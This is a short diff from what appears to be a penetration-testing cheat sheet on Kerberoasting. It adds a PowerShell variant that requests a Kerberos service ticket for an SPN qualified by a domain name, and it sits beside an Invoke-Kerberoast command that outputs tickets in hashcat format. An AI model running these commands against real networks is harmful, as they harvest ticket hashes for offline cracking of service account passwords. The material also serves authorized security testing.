@@ -163,6 +163,7 @@ Invoke-Kerberoast -Outputformat hashcat
 ```
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>@<FQDN>"
 ```
 
 ```
